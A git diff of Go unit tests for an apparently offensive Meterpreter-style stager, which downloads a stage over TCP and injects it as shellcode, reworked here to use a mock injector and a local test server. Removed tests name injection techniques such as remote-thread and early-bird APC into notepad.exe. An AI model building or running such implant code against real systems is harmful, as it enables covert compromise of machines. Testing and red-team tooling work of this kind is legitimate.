@@ -3,6 +3,7 @@ package meterpreter
 import (
 	"context"
 	"encoding/binary"
+	"fmt"
 	"net"
 	"strconv"
 	"testing"
@@ -83,75 +84,132 @@ func TestNewStager(t *testing.T) {
 	require.NotNil(t, s, "NewStager must return a non-nil Stager")
 }
 
-func TestNewStagerWithInjectionConfig(t *testing.T) {
-	cfg := &Config{
-		Transport:   TransportTCP,
-		Host:        "127.0.0.1",
-		Port:        "4444",
-		Timeout:     5 * time.Second,
-		Method:      inject.MethodCreateThread,
-		TargetPID:   0,
-		ProcessPath: "",
-		Fallback:    true,
-	}
-
-	s := NewStager(cfg)
-	require.NotNil(t, s)
-	assert.Equal(t, inject.MethodCreateThread, s.config.Method)
-	assert.True(t, s.config.Fallback)
-	assert.Equal(t, 0, s.config.TargetPID)
+// mockInjector records whether Inject was called and with what shellcode.
+type mockInjector struct {
+	called    bool
+	shellcode []byte
+	err       error
 }
 
-func TestNewStagerWithRemoteInjection(t *testing.T) {
+func (m *mockInjector) Inject(shellcode []byte) error {
+	m.called = true
+	m.shellcode = shellcode
+	return m.err
+}
+
+func TestNewStagerWithInjector(t *testing.T) {
+	mock := &mockInjector{}
 	cfg := &Config{
 		Transport: TransportTCP,
 		Host:      "127.0.0.1",
 		Port:      "4444",
 		Timeout:   5 * time.Second,
-		Method:    inject.MethodCreateRemoteThread,
-		TargetPID: 1234,
-		Fallback:  true,
+		Injector:  mock,
 	}
 
 	s := NewStager(cfg)
 	require.NotNil(t, s)
-	assert.Equal(t, inject.MethodCreateRemoteThread, s.config.Method)
-	assert.Equal(t, 1234, s.config.TargetPID)
+	assert.Equal(t, mock, s.config.Injector)
 }
 
-func TestNewStagerWithSpawnAndInject(t *testing.T) {
+func TestStagerWithInjector_DelegatesToInjector(t *testing.T) {
+	// Build a mock TCP server that sends a valid stage.
+	payload := make([]byte, 100) // 100 bytes > 50 min
+	for i := range payload {
+		payload[i] = byte(i)
+	}
+
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	require.NoError(t, err)
+	defer ln.Close()
+
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		conn, acceptErr := ln.Accept()
+		if acceptErr != nil {
+			return
+		}
+		defer conn.Close()
+
+		var sizeBuf [4]byte
+		binary.LittleEndian.PutUint32(sizeBuf[:], uint32(len(payload)))
+		conn.Write(sizeBuf[:]) //nolint:errcheck
+		conn.Write(payload)    //nolint:errcheck
+	}()
+
+	mock := &mockInjector{}
+	addr := ln.Addr().(*net.TCPAddr)
 	cfg := &Config{
-		Transport:   TransportHTTPS,
-		Host:        "10.0.0.1",
-		Port:        "8443",
-		Timeout:     30 * time.Second,
-		TLSInsecure: true,
-		Method:      inject.MethodEarlyBirdAPC,
-		ProcessPath: `C:\Windows\System32\notepad.exe`,
-		Fallback:    true,
+		Transport: TransportTCP,
+		Host:      "127.0.0.1",
+		Port:      strconv.Itoa(addr.Port),
+		Timeout:   5 * time.Second,
+		Injector:  mock,
+	}
+
+	stager := NewStager(cfg)
+	err = stager.Stage(context.Background())
+	require.NoError(t, err)
+	assert.True(t, mock.called, "Injector.Inject must be called")
+	assert.Equal(t, payload, mock.shellcode, "Injector must receive the stage payload")
+
+	<-done
+}
+
+func TestStagerWithInjector_PropagatesError(t *testing.T) {
+	payload := make([]byte, 100)
+
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	require.NoError(t, err)
+	defer ln.Close()
+
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		conn, acceptErr := ln.Accept()
+		if acceptErr != nil {
+			return
+		}
+		defer conn.Close()
+
+		var sizeBuf [4]byte
+		binary.LittleEndian.PutUint32(sizeBuf[:], uint32(len(payload)))
+		conn.Write(sizeBuf[:]) //nolint:errcheck
+		conn.Write(payload)    //nolint:errcheck
+	}()
+
+	injErr := fmt.Errorf("injection failed")
+	mock := &mockInjector{err: injErr}
+	addr := ln.Addr().(*net.TCPAddr)
+	cfg := &Config{
+		Transport: TransportTCP,
+		Host:      "127.0.0.1",
+		Port:      strconv.Itoa(addr.Port),
+		Timeout:   5 * time.Second,
+		Injector:  mock,
+	}
+
+	stager := NewStager(cfg)
+	err = stager.Stage(context.Background())
+	assert.ErrorIs(t, err, injErr, "Injector error must propagate")
+
+	<-done
+}
+
+func TestConfigInjectorNil_UsesDefaultPath(t *testing.T) {
+	cfg := &Config{
+		Transport: TransportTCP,
+		Host:      "127.0.0.1",
+		Port:      "4444",
+		Timeout:   5 * time.Second,
 	}
 
 	s := NewStager(cfg)
-	require.NotNil(t, s)
-	assert.Equal(t, inject.MethodEarlyBirdAPC, s.config.Method)
-	assert.Equal(t, `C:\Windows\System32\notepad.exe`, s.config.ProcessPath)
+	assert.Nil(t, s.config.Injector, "nil Injector means default self-injection path")
 }
 
 func TestDefaultMethodForStage(t *testing.T) {
 	m := inject.DefaultMethodForStage()
 	assert.NotEmpty(t, m, "DefaultMethodForStage must return a non-empty method")
-}
-
-func TestConfigMethodEmpty_UsesDefaultPath(t *testing.T) {
-	// When Method is empty, the stager should use the default
-	// executeInMemory path (no inject package routing).
-	cfg := &Config{
-		Transport: TransportTCP,
-		Host:      "127.0.0.1",
-		Port:      "4444",
-		Timeout:   5 * time.Second,
-	}
-
-	s := NewStager(cfg)
-	assert.Empty(t, s.config.Method, "empty Method means default self-injection path")
 }
